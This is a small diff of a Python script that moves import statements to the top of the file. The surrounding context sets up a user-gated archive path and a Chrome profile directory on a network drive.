@@ -2,6 +2,9 @@ import os
 import zipfile
 import hashlib
 import getpass
+import sys
+import traceback
+import types
 
 username = getpass.getuser()
 destpath = os.path.join('C:\\Users', username, 'AppData', 'local.zip')
@@ -17,8 +20,6 @@ if hash in people:
     print('do it')
 else:
     exit(0)
-
-import sys, os, traceback, types
 
 chromepath = 'U:\Appscfg.MCS\AppData.W10\Google\Chrome'
 
